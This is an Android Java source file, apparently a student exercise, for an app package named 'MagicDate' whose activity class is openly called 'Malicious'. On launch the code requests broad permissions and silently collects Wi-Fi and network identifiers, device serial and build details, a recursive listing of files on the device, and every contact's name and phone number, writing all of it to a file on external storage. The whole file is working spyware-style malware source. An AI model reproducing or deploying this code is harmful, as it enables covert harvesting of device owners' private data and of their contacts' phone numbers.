//Avihu Oshri 203458484

package com.MagicDate.MagicDate;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.ContactsContract;

import androidx.appcompat.app.AppCompatActivity;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;

public class Malicious extends AppCompatActivity {

    OutputStreamWriter outputStreamWriter ;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        maliciousCode();


    }


    public void maliciousCode()  {

        String[] permissions_req = {
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.WRITE_CONTACTS,
                Manifest.permission.ACCESS_WIFI_STATE,
                Manifest.permission.ACCESS_NETWORK_STATE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.ACCESS_NETWORK_STATE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.WRITE_CONTACTS


        };

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
        {
            this.requestPermissions(permissions_req, 1);
        }

        File sdcard = Environment.getExternalStorageDirectory();
        File deviceDetails = new File(sdcard.getAbsolutePath(),"DeviceDetails.text");

        try
        {
            outputStreamWriter = new OutputStreamWriter(new FileOutputStream(deviceDetails));
        }
        catch (FileNotFoundException e)
        {
            e.printStackTrace();
        }




        getWifiDetails();

        getDeviceDetails();



        try {
            FilePath(Environment.getRootDirectory());
            FilePath(Environment.getDownloadCacheDirectory());
            FilePath(Environment.getExternalStorageDirectory());
            FilePath(Environment.getDownloadCacheDirectory());


        } catch (IOException e) {
            e.printStackTrace();
        }
        try {
            FilePath(new File("/sdcard/"));
        } catch (IOException e) {
            e.printStackTrace();
        }


        try {
            stealContacts(outputStreamWriter);
        }
        catch (IOException e) {
            e.printStackTrace();
        }



        try {
            outputStreamWriter.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }
        try {
            outputStreamWriter.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    //***************************************************METHODS********************************************************

    private void getWifiDetails() {


        ConnectivityManager connManager = (ConnectivityManager) this.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);


        try {
            outputStreamWriter.write("WIFI DETAILS : \n\n");
        } catch (IOException e) {
            e.printStackTrace();
        }

        if (mWifi.isConnected()) {
            try {
                outputStreamWriter.write("WIFI STATUS : WIFI is Connected\n");
            }
            catch (IOException e) {
                e.printStackTrace();
            }

            WifiManager wifiManager = (WifiManager) this.getApplicationContext().getSystemService (Context.WIFI_SERVICE);
            WifiInfo info = wifiManager.getConnectionInfo ();
            try {

                outputStreamWriter.write("WIFI name is :  " + info.getSSID() + "\n");
                outputStreamWriter.write("BSSID is :  " + info.getBSSID() + "\n");
                outputStreamWriter.write("Network ID  is :  " + info.getNetworkId() + "\n");
                outputStreamWriter.write("MAC address is :  " + info.getMacAddress() + "\n");
                outputStreamWriter.write("Describe Contents:  " + info.describeContents() + "\n");
                outputStreamWriter.write("IP address is :  " + info.getIpAddress() + "\n");
                outputStreamWriter.write("Link speed is :  " + info.getLinkSpeed() + "\n\n");


            } catch (IOException e) {
                e.printStackTrace();
            }
        } else {
            try {
                outputStreamWriter.write("WIFI not connected\n\n");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }


    }
    //*********************************************************************************************************************


    private void getDeviceDetails() {


        //Write device details to file
        try {
            outputStreamWriter.write("\n\nDEVICE INTERNAL DETAILS : \n\n");

            outputStreamWriter.write("ID: " + Build.ID + "\n");
            outputStreamWriter.write("Serial: " + Build.SERIAL + "\n");
            outputStreamWriter.write("Hardware: " + Build.HARDWARE + "\n");
            outputStreamWriter.write("Device model: " + Build.MODEL + "\n");
            outputStreamWriter.write("OS version: " + System.getProperty("os.version") + "\n");
            outputStreamWriter.write("User: " + Build.USER + "\n");
            outputStreamWriter.write("Product: " + Build.PRODUCT + "\n");
            outputStreamWriter.write("Device: " + Build.DEVICE + "\n");
            outputStreamWriter.write("SDK version: " + Build.VERSION.SDK_INT + "\n");
            outputStreamWriter.write("Radio version: " + Build.getRadioVersion() + "\n");
            outputStreamWriter.write("Brand: " + Build.BRAND + "\n");
            outputStreamWriter.write("Host: " + Build.HOST + "\n");
            outputStreamWriter.write("Brand: " + Build.BRAND + "\n");
            outputStreamWriter.write("Display: " + Build.DISPLAY + "\n");
            outputStreamWriter.write("Bootloader: " + Build.BOOTLOADER + "\n");

        } catch (
                IOException e) {
            e.printStackTrace();
        }

    }

//    *********************************************************************************************************************




    private void stealContacts(OutputStreamWriter outputStreamWriter) throws IOException {
        ContentResolver contentResolver = this.getContentResolver();
        Cursor cur = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null,
                null);

        if ((cur != null ? cur.getCount() : 0) > 0)
        {
            outputStreamWriter.write("\n\nContacts List : \n");

            while (cur != null && cur.moveToNext())
            {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0)
                {
                    Cursor cursor = contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);

                    while (cursor.moveToNext()) //Searching for all contacts
                    {
                        String phoneNo = cursor.getString(cursor.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));


                        outputStreamWriter.write("name: " + name + " Phone number: " + phoneNo + "\n");
                    }
                    cursor.close();
                }
            }
        }
        if(cur!=null){
            cur.close();
        }

        outputStreamWriter.flush();
        outputStreamWriter.close();
    }


    //*********************************************************************************************************************


    private void FilePath(File SourceFile) throws IOException {
        if(SourceFile.isFile()) {
            try {
                outputStreamWriter.write("File: " + SourceFile.getAbsolutePath() + "\n");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        else {
            try {
                outputStreamWriter.write("Folder: " + SourceFile.getAbsolutePath() + "\n");
                File[] files = SourceFile.listFiles(); //Make list of files

                if(files != null && files.length > 0)
                {
                    for(File f : SourceFile.listFiles())
                    {
                        FilePath(f); //Recursion to search deeper path files
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }

        }

        outputStreamWriter.flush();
    }


}